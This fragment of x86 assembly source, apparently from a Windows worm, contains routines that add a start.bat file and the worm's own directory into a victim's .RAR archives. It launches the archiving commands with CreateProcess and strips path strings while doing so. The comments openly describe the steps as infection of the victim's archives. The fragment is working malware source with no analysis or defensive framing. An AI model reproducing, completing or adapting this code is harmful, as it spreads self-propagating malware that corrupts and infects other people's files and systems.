	mov	[save_inf_str_pointer], eax

	mov	esi, combine_name
	mov	edi, [combine_pointer]
	mov	ecx, 0x9
	rep	movsb

	add	[combine_pointer], 0x9
	mov	eax, [combine_pointer]
	mov	byte [eax], 0x0

	call	Run_Infection_Command				; Run the command! (add start.bat to the .RAR archive)

	mov	esi, worm_dir
	mov	edi, [save_inf_str_pointer]
	mov	ecx, 0x8
	rep	movsb						; Write the name of the directory
								; instead of the start.bat name
	add	[save_inf_str_pointer], 0x8
	mov	eax, [save_inf_str_pointer]
	mov	byte [eax], 0x0 				; Write a zero at the end of the string

	call	Run_Infection_Command				; Run the command! (add worm-directory to the .RAR archive)
ret

Run_Infection_Command:
	invoke	CreateProcess, \			; Execute the extrac32-string
		0x0, \					; Now the extracted version of the victim is in the temp-direcory
		[combine_data], \
		0x0, \
		0x0, \
		FALSE, \
		0x0, \
		0x0, \
		0x0, \
		STARTUPINFO_struct, \
		PROCESS_INFORMATION_struct

	invoke	Sleep, \				; Wait 6.333 Secunds until return.
		6333					; Reason: rar.exe may use much CPU-Speed, to reduce the
							; chance of conflicts, give it some time for working.
							; This has always worked when I've tested it.
ret

ChangeDirString:
; Delete the last backslash of the Current Directory-Path
	mov	ecx, [GetCDB_Size]
    CDS_loop:
	mov	eax, GetCurrentDir_buffer
	add	eax, ecx
	dec	ecx
	cmp	byte [eax], '\'
    jne CDS_loop

	mov	byte [eax], 0x0
	sub	eax, GetCurrentDir_buffer
	mov	[GetCDB_Size], eax
ret

 .end start